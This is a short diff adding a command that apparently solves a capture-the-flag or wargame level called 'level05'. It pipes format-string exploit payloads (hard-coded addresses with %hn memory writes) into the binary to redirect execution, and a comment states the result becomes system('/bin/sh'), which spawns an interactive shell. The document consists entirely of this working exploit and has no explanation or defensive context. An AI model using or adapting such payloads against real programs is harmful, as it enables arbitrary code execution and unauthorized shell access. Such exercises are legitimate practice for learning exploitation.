@@ -1,0 +1,10 @@
+
+(python - <<'PY'
+print "\xe2\x97\x04\x08\xe0\x97\x04\x08%2044x%10$hn%31808x%11$hn"
+
+print "\xd4\x97\x04\x08\xd6\x97\x04\x08%44744x%10$hn%18710x%11$hn"
+
+# Stage 3: this becomes system("/bin/sh")
+print "/bin/sh"
+PY
+cat) | ./level05
